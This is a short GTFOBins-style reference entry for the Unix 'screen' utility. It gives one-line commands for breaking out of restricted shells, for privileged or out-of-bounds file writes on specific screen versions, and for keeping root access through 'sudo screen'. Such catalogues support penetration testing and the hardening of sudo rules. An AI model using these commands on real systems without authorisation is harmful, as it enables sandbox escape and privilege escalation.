# GTFOBin: screen

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
screen
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

This works on screen version 4.06.02. Data is appended to the file and `\n` is converted to `\r\n`.

```
LFILE=file_to_write
screen -L -Logfile $LFILE echo DATA
```

This works on screen version 4.05.00. Data is appended to the file and `\n` is converted to `\r\n`.

```
LFILE=file_to_write
screen -L $LFILE echo DATA
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo screen
```